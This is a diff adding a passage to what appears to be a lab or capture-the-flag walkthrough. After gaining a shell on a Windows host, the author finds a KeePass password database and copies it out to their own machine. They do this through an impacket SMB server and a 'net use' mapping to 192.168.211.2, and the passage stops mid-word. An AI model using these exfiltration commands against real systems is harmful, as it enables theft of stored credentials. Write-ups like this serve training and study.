@@ -191,6 +191,33 @@ PS C:\Windows\System32>
 Now i have shell access on the system
 
 ```python
+PS C:\stored_passwords> dir
 
+
+    Directory: C:\stored_passwords
+
+
+Mode                 LastWriteTime         Length Name                                                                 
+----                 -------------         ------ ----                                                                 
+-a----         2/27/2026   2:12 PM           2782 it_passwords.kdbx                                                    
+-a----         2/27/2026   2:14 PM            956 README.txt                                                           
+
+
+PS C:\stored_passwords>
 ```
+Ill transfer these files to my machine 
 
+```python
+sudo impacket-smbserver share $(pwd) -smb2support -username hacker -password hackme
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+```
+This setup an SMB server
+
+```python
+PS C:\stored_passwords> net use Z: \\192.168.211.2\share /user:hacker hackme
+The command completed successfully.
+
+PS C:\stored_passwords> Copy-Item .\it_passwords.kdbx Z:\
+PS C:\stored_passwords> Copy-Item .\README.txt Z:\
+```
+This tranferred all the files to my m
